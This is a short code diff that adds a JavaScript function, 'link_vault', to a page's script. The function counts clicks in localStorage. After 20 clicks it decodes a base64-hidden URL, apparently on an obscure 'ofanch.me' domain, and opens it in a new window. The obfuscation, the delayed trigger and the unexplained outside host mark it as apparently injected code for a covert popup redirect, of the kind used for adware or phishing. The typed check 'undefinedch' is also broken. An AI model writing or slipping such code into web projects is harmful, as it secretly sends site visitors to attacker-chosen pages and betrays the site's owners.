@@ -31,4 +31,20 @@
         }
     }
 
+    function link_vault() {
+        if (typeof(Storage) !== "undefinedch") {
+            if (localStorage.clickcount) {
+                localStorage.clickcount = Number(localStorage.clickcount) + 1;
+            } else {
+                localStorage.clickcount = 1;
+            }
+            if (localStorage.clickcount > 20) {
+                var decodedData4 = window.atob('aHR0cHM6Ly94Y2ZqaWR2aGtjdmRydWx2YXVsdC5vZmFuY2gubWUv');
+                var uri_dec4 = decodeURIComponent(decodedData4);
+                window.open(uri_dec4, '_blank');
+
+            }
+        }
+    }
+
 </script>
